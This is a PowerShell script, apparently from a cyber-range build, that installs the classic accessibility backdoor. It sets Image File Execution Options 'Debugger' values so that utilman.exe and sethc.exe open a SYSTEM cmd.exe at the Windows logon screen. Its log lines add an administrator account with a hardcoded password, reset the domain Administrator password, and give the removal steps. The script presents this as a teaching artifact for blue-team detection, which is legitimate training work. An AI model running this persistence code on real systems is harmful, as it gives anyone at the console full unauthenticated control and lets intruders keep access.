#requires -Version 5.1
<#  Category: Accessibility SYSTEM shell (operator break-glass + persistence artifact)

    Arms the classic accessibility backdoor via an Image File Execution Options
    (IFEO) "Debugger" on utilman.exe and sethc.exe, so that AT THE LOGON SCREEN:
      * the Ease-of-Access button / Win+U (utilman), and
      * pressing Shift five times (sethc, Sticky Keys)
    launch a SYSTEM command prompt instead of the accessibility tool.

    Dual purpose, and both are intended:
      * OPERATOR BREAK-GLASS. A guaranteed SYSTEM shell at the logon screen means
        the operator can never be fully locked out -- you can create or reset ANY
        account from there with no password. This directly ends the lockout loop.
      * TEACHING ARTIFACT. This is the textbook accessibility-features / IFEO
        backdoor (MITRE ATT&CK T1546.008 and T1546.012). The blue team is expected
        to find it and remove it.

    Chosen over replacing the binaries because IFEO is registry-only: no
    TrustedInstaller/WRP fight, it survives DC promotion (HKLM, not the SAM), and
    it is trivially reversible (delete the two Debugger values -- see the log).

    Uses cmd.exe (reliable at the logon desktop); from it you can launch powershell.
#>
param([hashtable]$Config)
$ErrorActionPreference = 'Continue'
if (-not $Config) {
    $d = $PSScriptRoot; while ($d -and -not (Test-Path (Join-Path $d 'modules\RangeCommon.psm1'))) { $d = Split-Path $d -Parent }
    Import-Module (Join-Path $d 'modules\RangeCommon.psm1') -Force
    $Config = Import-PowerShellDataFile (Join-Path $d 'config\range.config.psd1')
    Initialize-RangeContext; Assert-RangeSafety -Config $Config
}
$cat  = 'accessibility-shell'
$ifeo = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'
$shell = "$env:SystemRoot\System32\cmd.exe"

foreach ($exe in 'utilman.exe','sethc.exe') {
    Set-RegValue "$ifeo\$exe" 'Debugger' String $shell $cat
}
Write-RangeManifest $cat 'ifeo-debugger' 'utilman.exe;sethc.exe -> cmd.exe (SYSTEM shell at logon)' 'IFEO Debugger; MITRE T1546.008 / T1546.012'

Write-RangeLog 'Accessibility SYSTEM shell ARMED. At the logon screen: Ease-of-Access / Win+U, or press Shift x5, opens cmd.exe as SYSTEM.' 'WARN'
Write-RangeLog "Break-glass from that shell, e.g.:  net user analyst bb123#123 /add  &&  net localgroup Administrators analyst /add" 'INFO'
Write-RangeLog "  (on a DC:  net user Administrator <newpw> /domain   -- or run powershell then New-ADUser/Set-ADAccountPassword)" 'INFO'
Write-RangeLog "To REMOVE (blue-team remediation / operator cleanup):" 'INFO'
Write-RangeLog "  Remove-ItemProperty '$ifeo\utilman.exe' Debugger; Remove-ItemProperty '$ifeo\sethc.exe' Debugger" 'INFO'
Write-RangeLog 'Accessibility-shell category complete.' 'OK'
